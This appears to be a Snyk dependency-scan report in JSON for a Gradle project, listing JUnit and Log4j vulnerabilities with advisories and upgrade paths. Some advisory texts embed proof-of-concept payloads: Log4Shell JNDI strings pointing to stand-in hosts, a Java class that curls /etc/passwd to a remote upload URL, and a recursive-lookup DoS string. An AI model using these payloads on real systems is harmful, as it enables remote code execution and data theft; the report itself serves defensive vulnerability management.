@@ -1,0 +1,710 @@
+{
+  "vulnerabilities": [
+    {
+      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:R",
+      "alternativeIds": [],
+      "creationTime": "2020-10-12T10:07:32.302340Z",
+      "credit": [
+        "Jonathan Leitschuh"
+      ],
+      "cvssScore": 2.9,
+      "description": "## Overview\n[junit:junit](https://mvnrepository.com/artifact/junit/junit) is an unit testing framework for Java\n\nAffected versions of this package are vulnerable to Information Exposure. The JUnit4 test rule `TemporaryFolder` contains a local information disclosure vulnerability. On Unix like systems, the system's temporary directory is shared between all users on that system. Because of this, when files and directories are written into this directory they are, by default, readable by other users on that same system.\r\n\r\n*Note:* This vulnerability does not allow other users to overwrite the contents of these directories or files.\r\nThis only affects Unix like systems.\n## Remediation\nUpgrade `junit:junit` to version 4.13.1 or higher.\n## References\n- [GitHub Commit](https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae)\n- [POC: GItHub Advisory](https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp)\n",
+      "disclosureTime": "2020-10-12T10:07:30Z",
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "4.13.1"
+      ],
+      "functions": [
+        {
+          "functionId": {
+            "className": "TemporaryFolder",
+            "filePath": "org/junit/rules/TemporaryFolder.java",
+            "functionName": "createTemporaryFolderIn"
+          },
+          "version": [
+            "[4.11-beta-1,4.13.1)"
+          ]
+        },
+        {
+          "functionId": {
+            "className": "TemporaryFolder",
+            "filePath": "org/junit/rules/TemporaryFolder.java",
+            "functionName": "newFolder"
+          },
+          "version": [
+            "[4.7,4.11-beta-1)"
+          ]
+        }
+      ],
+      "functions_new": [
+        {
+          "functionId": {
+            "className": "org.junit.rules.TemporaryFolder",
+            "functionName": "createTemporaryFolderIn"
+          },
+          "version": [
+            "[4.11-beta-1,4.13.1)"
+          ]
+        },
+        {
+          "functionId": {
+            "className": "org.junit.rules.TemporaryFolder",
+            "functionName": "newFolder"
+          },
+          "version": [
+            "[4.7,4.11-beta-1)"
+          ]
+        }
+      ],
+      "id": "SNYK-JAVA-JUNIT-1017047",
+      "identifiers": {
+        "CVE": [
+          "CVE-2020-15250"
+        ],
+        "CWE": [
+          "CWE-200"
+        ],
+        "GHSA": [
+          "GHSA-269g-pwp5-87pp"
+        ]
+      },
+      "language": "java",
+      "malicious": false,
+      "mavenModuleName": {
+        "artifactId": "junit",
+        "groupId": "junit"
+      },
+      "modificationTime": "2020-11-09T12:54:32.064016Z",
+      "moduleName": "junit:junit",
+      "packageManager": "maven",
+      "packageName": "junit:junit",
+      "patches": [],
+      "proprietary": true,
+      "publicationTime": "2020-10-13T14:27:37Z",
+      "references": [
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae"
+        },
+        {
+          "title": "POC: GItHub Advisory",
+          "url": "https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[4.7,4.13.1)"
+        ]
+      },
+      "severity": "low",
+      "severityWithCritical": "low",
+      "socialTrendAlert": false,
+      "title": "Information Exposure",
+      "from": [
+        "gradle-kts-goof@unspecified",
+        "org.jetbrains.kotlin:kotlin-test-junit@1.3.72",
+        "junit:junit@4.12"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "junit:junit",
+      "version": "4.12"
+    },
+    {
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H",
+      "alternativeIds": [],
+      "creationTime": "2021-12-10T10:08:46.155884Z",
+      "credit": [
+        "Chen Zhaojun of Alibaba Cloud Security Team"
+      ],
+      "cvssScore": 10,
+      "description": "## Overview\n\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE).\nApache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.\r\n\r\nFrom log4j 2.15.0, JNDI LDAP endpoints are restricted to localhost by default.\r\n\r\n\r\n## PoC\r\nWhen an application uses log4j to log user input, an attacker can exploit this vulnerability, by supplying a malicious string that the application logs - for example,  `${jndi:ldap://someurl/Evil}`. This causes the application to execute a malicious class supplied by an attacker’s LDAP server (`someurl/Evil` in this example).\r\n\r\nFor example, the vulnerability can be used to inject this malicious class into an application:\r\n```java\r\npublic class Evil implements ObjectFactory  {\r\n   @Override\r\n   public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {\r\n       Runtime.getRuntime().exec(\"curl -F 'file=@/etc/passw‍đ' https://someurl/upload\");\r\n       return  null;\r\n   }\r\n}\r\n```\r\nThis causes the application to disclose the `etc/passwd` file on the system, and send it to a remote attacker.\r\n\r\n## Further Remediation Options\r\nIf upgrading the version is not possible, we strongly recommend to mitigate the vulnerability using one of these methods:\r\n\r\n* Remove `JndiLookup.class` from the class path (i.e: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`. While not pertinent to log4shell, consider also removing `JndiManager`, `JMSAppender` and `SMTPAppender` if you are not using them, as there are unconfirmed reports they could be leveraged in similar attacks in the future.\r\n* Partial mitigation: disable lookups via system properties or environmental variables. If you use log4j >=2.10.0, you can set the system property `LOG4J_FORMAT_MSG_NO_LOOKUPS` or the environmental variable `Dlog4j2.formatMsgNoLookups` to `true`. (RCE is possible in some non-default Pattern Layout configurations that use a Context Lookup or a Thread Context Map pattern.)\r\n\r\n<br>Upgrading your JDK versions is not enough to mitigate this vulnerability in all circumstances, as it was proven that setting the `com.sun.jndi.ldap.object.trustURLCodebase` property to `false` is not enough.\r\n<br>For more remediation advice, please visit the [Log4j Remediation Cheat Sheet](https://snyk.io/blog/log4shell-remediation-cheat-sheet/) post.\r\n\r\n\r\n**Note**: `org.apache.logging.log4j:log4j-api` was originally deemed vulnerable, but Apache maintainers have since [clarified](https://issues.apache.org/jira/browse/LOG4J2-3201) that this only affects `org.apache.logging.log4j:log4j-core`.\n\n## Remediation\n\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.15.0 or higher.\n\n\nUse [this guide](https://snyk.io/blog/find-fix-log4shell-quickly-snyk/) to scan your projects for the Log4Shell vulnerability.\n\n## References\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3198)\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3201)\n\n- [Apache Security Advisory](https://logging.apache.org/log4j/2.x/security.html)\n\n- [GitHub PR](https://github.com/apache/logging-log4j2/pull/608)\n\n- [PoC](https://github.com/Kirill89/log4shell-vulnerable-server)\n\n- [Snyk Blog and Vulnerability Breakdown](https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/)\n",
+      "disclosureTime": "2021-12-10T10:02:55Z",
+      "exploit": "High",
+      "fixedIn": [
+        "2.3.1",
+        "2.12.2",
+        "2.15.0"
+      ],
+      "functions": [
+        {
+          "functionId": {
+            "className": "JndiLookup",
+            "filePath": "org/apache/logging/log4j/core/lookup/JndiLookup.java",
+            "functionName": "lookup"
+          },
+          "version": [
+            "[2.0-beta9,2.3.1)",
+            "[2.4,2.12.2)",
+            "[2.13.0,2.15.0)"
+          ]
+        }
+      ],
+      "functions_new": [
+        {
+          "functionId": {
+            "className": "org.apache.logging.log4j.core.lookup.JndiLookup",
+            "functionName": "lookup"
+          },
+          "version": [
+            "[2.0-beta9,2.3.1)",
+            "[2.4,2.12.2)",
+            "[2.13.0,2.15.0)"
+          ]
+        }
+      ],
+      "id": "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720",
+      "identifiers": {
+        "CVE": [
+          "CVE-2021-44228"
+        ],
+        "CWE": [
+          "CWE-94"
+        ],
+        "GHSA": [
+          "GHSA-jfh8-c2jp-5v3q"
+        ]
+      },
+      "language": "java",
+      "malicious": false,
+      "mavenModuleName": {
+        "artifactId": "log4j-core",
+        "groupId": "org.apache.logging.log4j"
+      },
+      "modificationTime": "2022-01-19T17:23:37.388609Z",
+      "moduleName": "org.apache.logging.log4j:log4j-core",
+      "packageManager": "maven",
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2021-12-10T10:10:01Z",
+      "references": [
+        {
+          "title": "Apache Jira Issues",
+          "url": "https://issues.apache.org/jira/browse/LOG4J2-3198"
+        },
+        {
+          "title": "Apache Jira Issues",
+          "url": "https://issues.apache.org/jira/browse/LOG4J2-3201"
+        },
+        {
+          "title": "Apache Security Advisory",
+          "url": "https://logging.apache.org/log4j/2.x/security.html"
+        },
+        {
+          "title": "GitHub PR",
+          "url": "https://github.com/apache/logging-log4j2/pull/608"
+        },
+        {
+          "title": "PoC",
+          "url": "https://github.com/Kirill89/log4shell-vulnerable-server"
+        },
+        {
+          "title": "Snyk Blog and Vulnerability Breakdown",
+          "url": "https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.0-beta9,2.3.1)",
+          "[2.4,2.12.2)",
+          "[2.13.0,2.15.0)"
+        ]
+      },
+      "severity": "critical",
+      "severityWithCritical": "critical",
+      "socialTrendAlert": true,
+      "title": "Remote Code Execution (RCE)",
+      "from": [
+        "gradle-kts-goof@unspecified",
+        "org.apache.logging.log4j:log4j-core@2.14.1"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.logging.log4j:log4j-core@2.15.0"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1"
+    },
+    {
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C",
+      "alternativeIds": [],
+      "creationTime": "2021-12-14T18:28:31.339218Z",
+      "credit": [
+        "Unknown"
+      ],
+      "cvssScore": 9,
+      "description": "## Overview\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) if one of the following conditions is met:\r\n\r\n1. Logging configuration explicitly enables lookups – either by default (if using a version lower than 2.15.0) or manually by using `%m{lookups}` as `formatMsgNoLookups` is switched on by default as of version 2.15.0.\r\n2. Or uses a non-default Pattern Layout with Context Lookup where attackers can control input data via Thread Context Map (MDC),\r\n3. Or uses `Logger.printf(\"%s\", userInput)` function where attackers can control the userInput variable.\r\n\r\nA malicious actor is able to bypass the mitigation implemented in version 2.15.0 that limits JNDI lookups to localhost only: `${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`.\r\n\r\nWe recommend updating to version 2.16.0 which completely disables JNDI lookups by default. If upgrading is not an option, this issue can be mitigated in prior releases by removing the `JndiLookup` class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).\r\n\r\n### PoC\r\n\r\nIn config:\r\n```\r\n<pattern>%d %p %c{1.} [%t] $${ctx:loginId} %m%n</pattern>\r\n```\r\n\r\nIn code:\r\n```java\r\nThreadContext.put(\"loginId\", UserControlledInput);\r\n```\r\n\r\n### History\r\n\r\nThis vulnerability was previously assigned a CVSS score of 3.7 (Low), and the impact was believed to be Denial of Service (DoS).\r\n\r\nFurthermore, the advisory previously mentioned Thread Context Map patterns (%X, %mdc, or %MDC) as being vulnerable to this issue, but that has since been proven wrong.\r\n\r\nOn December 17, 2021 new information came to light, demonstrating that an Arbitrary Code Execution vulnerability still exists in version 2.15.0 of Log4j due to a bypass to the localhost-only lookup mechanism.\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.16.0 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f)\n- [Apache Security Page](https://logging.apache.org/log4j/2.x/security.html)\n- [Twitter Post](https://twitter.com/marcioalm/status/1471740771581652995)\n",
+      "disclosureTime": "2021-12-14T18:01:28Z",
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.3.1",
+        "2.12.2",
+        "2.16.0"
+      ],
+      "functions": [],
+      "functions_new": [],
+      "id": "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2320014",
+      "identifiers": {
+        "CVE": [
+          "CVE-2021-45046"
+        ],
+        "CWE": [
+          "CWE-94"
+        ],
+        "GHSA": [
+          "GHSA-7rjr-3q55-vv33"
+        ]
+      },
+      "language": "java",
+      "malicious": false,
+      "mavenModuleName": {
+        "artifactId": "log4j-core",
+        "groupId": "org.apache.logging.log4j"
+      },
+      "modificationTime": "2021-12-22T06:47:03.298604Z",
+      "moduleName": "org.apache.logging.log4j:log4j-core",
+      "packageManager": "maven",
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2021-12-14T18:44:00Z",
+      "references": [
+        {
+          "title": "Apache Pony Mail",
+          "url": "https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f"
+        },
+        {
+          "title": "Apache Security Page",
+          "url": "https://logging.apache.org/log4j/2.x/security.html"
+        },
+        {
+          "title": "Twitter Post",
+          "url": "https://twitter.com/marcioalm/status/1471740771581652995"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.0-beta9,2.3.1)",
+          "[2.4,2.12.2)",
+          "[2.13.0,2.16.0)"
+        ]
+      },
+      "severity": "critical",
+      "severityWithCritical": "critical",
+      "socialTrendAlert": false,
+      "title": "Remote Code Execution (RCE)",
+      "from": [
+        "gradle-kts-goof@unspecified",
+        "org.apache.logging.log4j:log4j-core@2.14.1"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.logging.log4j:log4j-core@2.16.0"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1"
+    },
+    {
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
+      "alternativeIds": [],
+      "creationTime": "2021-12-17T18:23:58.542986Z",
+      "credit": [
+        "Hideki Okamoto of Akamai Technologies"
+      ],
+      "cvssScore": 7.5,
+      "description": "## Overview\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). Does not protect against uncontrolled recursion from self-referential lookups. \r\n\r\nWhen the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, `$${ctx:loginId}`), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a `StackOverflowError` that will terminate the process.\r\n\r\n### PoC\r\n\r\nIn `log4j.properties`:\r\n```java\r\nappender.console.type = Console\r\nappender.console.name = console\r\nappender.console.layout.type = PatternLayout\r\nappender.console.layout.pattern = !${ctx:test}! %m%n\r\nrootLogger.level = ALL\r\nrootLogger.appenderRef.file.ref = console\r\n```\r\n\r\nIn `Main.java`:\r\n```java\r\nThreadContext.put(\"test\", \"${::-${ctx:test}}\");\r\nlogger.error(\"boom\"); // Will not be logged\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.3, 2.17.0 or higher.\n## References\n- [Apache Security](https://logging.apache.org/log4j/2.x/security.html)\n- [JIRA Issue](https://issues.apache.org/jira/browse/LOG4J2-3230)\n",
+      "disclosureTime": "2021-12-17T18:20:21Z",
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.3.1",
+        "2.12.3",
+        "2.17.0"
+      ],
+      "functions": [],
+      "functions_new": [],
+      "id": "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2321524",
+      "identifiers": {
+        "CVE": [
+          "CVE-2021-45105"
+        ],
+        "CWE": [
+          "CWE-400"
+        ]
+      },
+      "language": "java",
+      "malicious": false,
+      "mavenModuleName": {
+        "artifactId": "log4j-core",
+        "groupId": "org.apache.logging.log4j"
+      },
+      "modificationTime": "2021-12-22T06:48:33.014227Z",
+      "moduleName": "org.apache.logging.log4j:log4j-core",
+      "packageManager": "maven",
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2021-12-18T07:05:00Z",
+      "references": [
+        {
+          "title": "Apache Security",
+          "url": "https://logging.apache.org/log4j/2.x/security.html"
+        },
+        {
+          "title": "JIRA Issue",
+          "url": "https://issues.apache.org/jira/browse/LOG4J2-3230"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.0-beta9,2.3.1)",
+          "[2.4,2.12.3)",
+          "[2.13.0,2.17.0)"
+        ]
+      },
+      "severity": "high",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Denial of Service (DoS)",
+      "from": [
+        "gradle-kts-goof@unspecified",
+        "org.apache.logging.log4j:log4j-core@2.14.1"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.logging.log4j:log4j-core@2.17.0"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1"
+    },
+    {
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
+      "alternativeIds": [],
+      "creationTime": "2021-12-28T19:42:55.818691Z",
+      "credit": [
+        "Unknown"
+      ],
+      "cvssScore": 6.6,
+      "description": "## Overview\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. <br /> **Note:** Even though this vulnerability appears to be related to the [log4Shell vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), this vulnerability requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nAn attacker with access to modification of logging configuration is able to configure `JDBCAppender` with a data source referencing a JNDI URI - which can execute malicious code.\r\n\r\nIn the fixed versions, `JDBCAppender` is using `JndiManager` and disables JNDI lookups by default (via `log4j2.enableJndiJdbc=false`).\r\n\r\n## Alternative Remediation\r\nIf you have reason to believe your application may be vulnerable and upgrading is not an option, you can either:\r\n\r\n* Disable/remove `JDBCAppender`\r\n* If `JDBCAppender` is used, make sure that it is not configured to use any protocol other than Java\n## Remediation\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.2, 2.12.4, 2.17.1 or higher.\n## References\n- [Apache Security Page](https://logging.apache.org/log4j/2.x/security.html)\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-3293)\n- [Openwall Mail](https://www.openwall.com/lists/oss-security/2021/12/28/1)\n",
+      "disclosureTime": "2021-12-28T19:42:53Z",
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.3.2",
+        "2.12.4",
+        "2.17.1"
+      ],
+      "functions": [],
+      "functions_new": [],
+      "id": "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2327339",
+      "identifiers": {
+        "CVE": [
+          "CVE-2021-44832"
+        ],
+        "CWE": [
+          "CWE-94"
+        ]
+      },
+      "language": "java",
+      "malicious": false,
+      "mavenModuleName": {
+        "artifactId": "log4j-core",
+        "groupId": "org.apache.logging.log4j"
+      },
+      "modificationTime": "2021-12-28T20:17:52.104061Z",
+      "moduleName": "org.apache.logging.log4j:log4j-core",
+      "packageManager": "maven",
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2021-12-28T20:17:52Z",
+      "references": [
+        {
+          "title": "Apache Security Page",
+          "url": "https://logging.apache.org/log4j/2.x/security.html"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16"
+        },
+        {
+          "title": "Jira Issue",
+          "url": "https://issues.apache.org/jira/browse/LOG4J2-3293"
+        },
+        {
+          "title": "Openwall Mail",
+          "url": "https://www.openwall.com/lists/oss-security/2021/12/28/1"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.0-beta7,2.3.2)",
+          "[2.4,2.12.4)",
+          "[2.13.0,2.17.1)"
+        ]
+      },
+      "severity": "medium",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Arbitrary Code Execution",
+      "from": [
+        "gradle-kts-goof@unspecified",
+        "org.apache.logging.log4j:log4j-core@2.14.1"
+      ],
+      "upgradePath": [
+        false,
+        "org.apache.logging.log4j:log4j-core@2.17.1"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1"
+    }
+  ],
+  "ok": false,
+  "dependencyCount": 14,
+  "org": "bastian.doetsch",
+  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.22.1\nignore: {}\npatch: {}\n",
+  "isPrivate": true,
+  "licensesPolicy": {
+    "severities": {},
+    "orgLicenseRules": {
+      "AGPL-1.0": {
+        "licenseType": "AGPL-1.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "AGPL-3.0": {
+        "licenseType": "AGPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "Artistic-1.0": {
+        "licenseType": "Artistic-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "Artistic-2.0": {
+        "licenseType": "Artistic-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CDDL-1.0": {
+        "licenseType": "CDDL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CPOL-1.02": {
+        "licenseType": "CPOL-1.02",
+        "severity": "high",
+        "instructions": ""
+      },
+      "EPL-1.0": {
+        "licenseType": "EPL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "GPL-2.0": {
+        "licenseType": "GPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "GPL-3.0": {
+        "licenseType": "GPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "LGPL-2.0": {
+        "licenseType": "LGPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-2.1": {
+        "licenseType": "LGPL-2.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-3.0": {
+        "licenseType": "LGPL-3.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-1.1": {
+        "licenseType": "MPL-1.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-2.0": {
+        "licenseType": "MPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MS-RL": {
+        "licenseType": "MS-RL",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "SimPL-2.0": {
+        "licenseType": "SimPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      }
+    }
+  },
+  "packageManager": "gradle",
+  "ignoreSettings": null,
+  "summary": "5 vulnerable dependency paths",
+  "remediation": {
+    "unresolved": [
+      {
+        "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:R",
+        "alternativeIds": [],
+        "creationTime": "2020-10-12T10:07:32.302340Z",
+        "credit": [
+          "Jonathan Leitschuh"
+        ],
+        "cvssScore": 2.9,
+        "description": "## Overview\n[junit:junit](https://mvnrepository.com/artifact/junit/junit) is an unit testing framework for Java\n\nAffected versions of this package are vulnerable to Information Exposure. The JUnit4 test rule `TemporaryFolder` contains a local information disclosure vulnerability. On Unix like systems, the system's temporary directory is shared between all users on that system. Because of this, when files and directories are written into this directory they are, by default, readable by other users on that same system.\r\n\r\n*Note:* This vulnerability does not allow other users to overwrite the contents of these directories or files.\r\nThis only affects Unix like systems.\n## Remediation\nUpgrade `junit:junit` to version 4.13.1 or higher.\n## References\n- [GitHub Commit](https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae)\n- [POC: GItHub Advisory](https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp)\n",
+        "disclosureTime": "2020-10-12T10:07:30Z",
+        "exploit": "Proof of Concept",
+        "fixedIn": [
+          "4.13.1"
+        ],
+        "functions": [
+          {
+            "functionId": {
+              "className": "TemporaryFolder",
+              "filePath": "org/junit/rules/TemporaryFolder.java",
+              "functionName": "createTemporaryFolderIn"
+            },
+            "version": [
+              "[4.11-beta-1,4.13.1)"
+            ]
+          },
+          {
+            "functionId": {
+              "className": "TemporaryFolder",
+              "filePath": "org/junit/rules/TemporaryFolder.java",
+              "functionName": "newFolder"
+            },
+            "version": [
+              "[4.7,4.11-beta-1)"
+            ]
+          }
+        ],
+        "functions_new": [
+          {
+            "functionId": {
+              "className": "org.junit.rules.TemporaryFolder",
+              "functionName": "createTemporaryFolderIn"
+            },
+            "version": [
+              "[4.11-beta-1,4.13.1)"
+            ]
+          },
+          {
+            "functionId": {
+              "className": "org.junit.rules.TemporaryFolder",
+              "functionName": "newFolder"
+            },
+            "version": [
+              "[4.7,4.11-beta-1)"
+            ]
+          }
+        ],
+        "id": "SNYK-JAVA-JUNIT-1017047",
+        "identifiers": {
+          "CVE": [
+            "CVE-2020-15250"
+          ],
+          "CWE": [
+            "CWE-200"
+          ],
+          "GHSA": [
+            "GHSA-269g-pwp5-87pp"
+          ]
+        },
+        "language": "java",
+        "malicious": false,
+        "mavenModuleName": {
+          "artifactId": "junit",
+          "groupId": "junit"
+        },
+        "modificationTime": "2020-11-09T12:54:32.064016Z",
+        "moduleName": "junit:junit",
+        "packageManager": "maven",
+        "packageName": "junit:junit",
+        "patches": [],
+        "proprietary": true,
+        "publicationTime": "2020-10-13T14:27:37Z",
+        "references": [
+          {
+            "title": "GitHub Commit",
+            "url": "https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae"
+          },
+          {
+            "title": "POC: GItHub Advisory",
+            "url": "https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"
+          }
+        ],
+        "semver": {
+          "vulnerable": [
+            "[4.7,4.13.1)"
+          ]
+        },
+        "severity": "low",
+        "severityWithCritical": "low",
+        "socialTrendAlert": false,
+        "title": "Information Exposure",
+        "from": [
+          "gradle-kts-goof@unspecified",
+          "org.jetbrains.kotlin:kotlin-test-junit@1.3.72",
+          "junit:junit@4.12"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": false,
+        "isRuntime": false,
+        "name": "junit:junit",
+        "version": "4.12"
+      }
+    ],
+    "upgrade": {
+      "org.apache.logging.log4j:log4j-core@2.14.1": {
+        "upgradeTo": "org.apache.logging.log4j:log4j-core@2.17.1",
+        "upgrades": [
+          "org.apache.logging.log4j:log4j-core@2.14.1",
+          "org.apache.logging.log4j:log4j-core@2.14.1",
+          "org.apache.logging.log4j:log4j-core@2.14.1",
+          "org.apache.logging.log4j:log4j-core@2.14.1"
+        ],
+        "vulns": [
+          "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2327339",
+          "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2321524",
+          "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2320014",
+          "SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720"
+        ]
+      }
+    },
+    "patch": {},
+    "ignore": {},
+    "pin": {}
+  },
+  "filesystemPolicy": false,
+  "filtered": {
+    "ignore": [],
+    "patch": []
+  },
+  "uniqueCount": 5,
+  "targetFile": "build.gradle.kts",
+  "projectName": "gradle-kts-goof",
+  "displayTargetFile": "build.gradle.kts",
+  "path": "/Users/bdoetsch/workspace/gradle-kts-goof"
+}
